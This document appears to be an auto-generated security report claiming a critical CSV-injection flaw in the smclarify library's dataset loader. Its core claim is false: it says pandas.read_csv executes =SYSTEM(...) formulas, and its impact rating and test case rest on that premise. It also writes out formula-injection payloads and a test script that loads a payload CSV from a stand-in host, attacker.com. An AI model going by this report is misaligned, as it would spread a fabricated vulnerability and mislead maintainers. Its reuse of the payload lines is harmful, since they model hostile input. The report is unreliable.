## Combined Vulnerability List

### CSV Injection in Dataset Loading

- **Description:**
  - An attacker crafts a malicious CSV file containing formulas (e.g., `=SYSTEM("malicious_command")` or `=SYSTEM("calc")`). These formulas can start with characters like '=', '@', or '+'.
  - The attacker hosts this malicious CSV file on a public S3 bucket or a web server, making it accessible to potential victims.
  - A user, intending to use `smclarify` for bias analysis or other functionalities, is tricked or unknowingly uses a dataset path pointing to the attacker's malicious CSV file. This could occur through social engineering, typos, or compromised data sources.
  - The `smclarify` library, through its `Datasets` class and `S3Dataset` module, uses `pandas.read_csv` to load the dataset from the provided path.
  - If the pandas library version used by `smclarify` is vulnerable to CSV injection, `pandas.read_csv` executes the malicious formulas embedded in the CSV during parsing. This behavior depends on the user's pandas environment configuration and potentially settings in spreadsheet software if the loaded CSV is later opened with tools like Excel or LibreOffice.
  - This results in arbitrary code execution on the user's system with the privileges of the user running `smclarify`. It can also lead to information disclosure if the formulas are designed to extract and send sensitive data.

- **Impact:**
  - Arbitrary code execution. An attacker can potentially gain full control over the user's system. This can lead to severe consequences including:
    - Data breaches and exfiltration of sensitive information.
    - Installation of malware, ransomware, or other malicious software.
    - Complete system compromise and unauthorized access.
    - Denial of service by disrupting system operations or deleting critical files.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  - None. The code within `smclarify/util/dataset.py` directly utilizes `pandas.read_csv` and `pd.read_parquet` without any input sanitization, secure parsing configurations, or measures to disable formula execution.

- **Missing Mitigations:**
  - **Input Sanitization:** Implement robust sanitization of datasets before parsing with pandas. This should include:
    - Neutralizing or removing potentially malicious content like CSV formulas by escaping or stripping characters like '=', '@', and '+'.
    - Validating data types and formats to prevent unexpected input that could be exploited.
  - **Secure Parsing Configuration:** Configure `pandas.read_csv` to disable features that could lead to code injection, specifically formula execution, if pandas provides such options or secure parsing modes. Explore parameters like `engine='python'` or other security-related settings in `pandas.read_csv` documentation.
  - **Sandboxing/Isolation:** Execute dataset loading and analysis processes within a sandboxed environment or container. This would limit the impact of any successful code execution by restricting the attacker's access to the host system and network.
  - **Input Validation and Source Integrity Checks:** Implement checks to validate the source and integrity of datasets.
    - Verify datasets are loaded only from trusted and verified origins or allowlists.
    - Implement checksum or digital signature verification to ensure datasets have not been tampered with during transit or storage.
  - **User Awareness and Documentation:**  Document the risk of CSV injection and advise users to:
    - Be extremely cautious when loading CSV files from untrusted or external sources.
    - Understand the potential risks associated with running code from external datasets.
    - Keep their pandas library and related dependencies updated to the latest versions, which may include security patches.

- **Preconditions:**
  - **Attacker Controlled CSV File:** The attacker must have the ability to create and host a malicious CSV file at an accessible location, such as a public web server or S3 bucket, or compromise a legitimate data source.
  - **User Dataset Path Manipulation:** A user must be induced, either intentionally or unintentionally, to provide a dataset path to `smclarify` that points to the attacker's malicious CSV file.
  - **Vulnerable pandas Version:** The version of the pandas library used by `smclarify` or by the user's environment must be susceptible to CSV injection or similar formula execution vulnerabilities.

- **Source Code Analysis:**
  - **File:** `/code/src/smclarify/util/dataset.py`
  - **Class:** `S3Dataset` (and potentially other Dataset classes that load CSV data)
  - **Function:** `read_csv_data(self, index_col=False) -> pd.DataFrame`
  - **Vulnerable Code Snippet:**
    ```python
    def read_csv_data(self, index_col=False) -> pd.DataFrame:
        self.ensure_local()
        return pd.read_csv(self.local_path(), index_col=index_col)
    ```
  - **Analysis:**
    1. The `read_csv_data` function is responsible for loading CSV data into a pandas DataFrame.
    2. It calls `self.ensure_local()` to ensure the dataset file is locally available, which might involve downloading it from a remote source based on `self.local_path()`.
    3. Critically, it directly uses `pd.read_csv(self.local_path(), index_col=index_col)` to parse the CSV file.
    4. There is no input validation or sanitization performed on the CSV file content before it is processed by `pd.read_csv`.
    5. If `self.local_path()` points to a malicious CSV file crafted by an attacker and `pandas.read_csv` is vulnerable to CSV injection (depending on version and environment), parsing this malicious CSV will trigger the execution of embedded formulas.
    - **Visualization:**
      ```mermaid
      graph LR
          A[User provides dataset path to smclarify] --> B(Datasets Class);
          B --> C{Is dataset CSV?};
          C -- Yes --> D(S3Dataset or similar class);
          D --> E[read_csv_data() function];
          E --> F[pd.read_csv(self.local_path())];
          F -- Malicious CSV --> G{pandas.read_csv Vulnerable?};
          G -- Yes --> H[Code Execution on User System];
          G -- No --> I[CSV Loaded Normally];
      ```

- **Security Test Case:**
  1. **Prepare Attacker Server:** Set up a publicly accessible web server (e.g., using Python's `http.server` or a cloud-based hosting service).
  2. **Create Malicious CSV File (malicious.csv):** Create a CSV file with the following content to test for command execution. This example uses `=SYSTEM("touch /tmp/smclarify_pwned")` for Linux/macOS and `=SYSTEM("echo pwned > C:\smclarify_pwned.txt")` for Windows. Choose the appropriate command for your testing environment.
     ```csv
     Column1,Column2
     test,=SYSTEM("touch /tmp/smclarify_pwned")
     ```
     or (for Windows test environment):
     ```csv
     Column1,Column2
     test,=SYSTEM("echo pwned > C:\smclarify_pwned.txt")
     ```
  3. **Host Malicious CSV:** Place `malicious.csv` on the attacker's web server. For example, if using Python's `http.server` on `attacker.com` port 8000, the file will be accessible at `http://attacker.com:8000/malicious.csv`.
  4. **Modify smclarify Test Script:** Create or modify a Python script that uses `smclarify` to load a dataset.  Adapt the provided example script, ensuring to replace `"http://attacker.com:8000/malicious.csv"` with the actual URL where you hosted the malicious CSV. Adjust the file path check (`/tmp/smclarify_pwned` or `C:\smclarify_pwned.txt`) according to the command used in the malicious CSV and your OS.
     ```python
     import smclarify
     import pandas as pd
     import os

     class MaliciousDataset(smclarify.util.dataset.Dataset):
         def __init__(self, id, source, description):
             super().__init__(id, source, description)
         def ensure_local(self) -> None:
             pass
         def train(self) -> pd.DataFrame:
             return pd.DataFrame()
         def read_csv_data(self, index_col=False) -> pd.DataFrame:
             return pd.read_csv(self.source, index_col=index_col)


     datasets_instance = smclarify.util.dataset.Datasets()
     datasets_instance.datasets["malicious_dataset"] = MaliciousDataset(
         "malicious_dataset",
         "http://attacker.com:8000/malicious.csv", # Replace with your malicious CSV URL
         "Malicious Dataset for CSV injection test",
     )

     try:
         df = datasets_instance("malicious_dataset").read_csv_data()
         print("CSV loaded successfully (unexpected if vulnerable):")
         print(df)
     except Exception as e:
         print(f"Error loading CSV (expected if vulnerable or pandas patched): {e}")

     pwned_file = "/tmp/smclarify_pwned" # For Linux/macOS test
     # pwned_file = "C:\smclarify_pwned.txt" # For Windows test

     if os.path.exists(pwned_file):
         print(f"VULNERABILITY CONFIRMED: {pwned_file} file created, indicating code execution!")
         os.remove(pwned_file) # Cleanup for repeated tests
     else:
         print(f"Vulnerability NOT confirmed: {pwned_file} file NOT created (pandas might be patched or not vulnerable).")
     ```
  5. **Run Test Script:** Execute the Python script in an environment where `smclarify` and a potentially vulnerable version of pandas are installed. You may need to use an older version of pandas if the latest version is patched against CSV injection.
  6. **Check for Command Execution:** After running the script, check if the file `/tmp/smclarify_pwned` (or `C:\smclarify_pwned.txt` for Windows test) has been created.
     - **If the file exists:** This confirms the CSV injection vulnerability. The `=SYSTEM()` command within the malicious CSV was executed by `pandas.read_csv`, leading to arbitrary code execution.
     - **If the file does not exist:** This indicates that either the pandas version is patched against CSV injection, or the system's security settings prevented the command execution. Further investigation might be needed, potentially trying different formula types or pandas versions.
